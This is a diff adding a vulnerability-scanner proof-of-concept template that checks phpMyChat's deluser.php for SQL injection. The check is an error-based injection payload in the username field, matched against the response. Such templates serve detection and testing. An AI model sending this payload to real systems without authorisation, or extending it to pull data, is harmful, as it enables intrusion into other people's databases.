@@ -1,0 +1,13 @@
+name: poc-yaml-phpMyChat-sqli
+rules:
+  - method: POST
+    path: "/plus/deluser.php"
+    body: >-
+      L=english&Link=&LIMIT=0&pmc_username=test' OR (SELECT 7708 FROM(SELECT COUNT(*),CONCAT(0x7170627a71,(SELECT (ELT(7708=7708,1))),0x7162627a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- ShDx&pmc_password=test&login_form=Log In
+    expression: |
+      response.status==200 && response.body.bcontains(b'error')
+
+detail:
+  author: xiaoming
+  links:
+    - https://www.exploit-db.com/exploits/48066
